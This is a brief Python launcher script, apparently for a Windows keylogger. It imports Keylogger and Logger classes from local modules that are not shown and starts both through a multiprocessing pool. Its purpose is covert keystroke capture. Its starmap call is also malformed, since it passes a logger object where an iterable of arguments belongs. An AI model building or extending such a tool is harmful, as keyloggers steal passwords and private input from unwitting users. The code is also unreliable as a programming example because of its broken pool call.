from multiprocessing import Pool
import logging
import os

from utils.keylogger import Keylogger
from utils.logger import Logger


if __name__ == "__main__":
  if os.name == "nt":
    keylogger = Keylogger()
    logger = Logger()
    with Pool(processes=2) as pool:
      pool.starmap(keylogger, logger)
  else:
    logging.exception("Unsupported OS.")
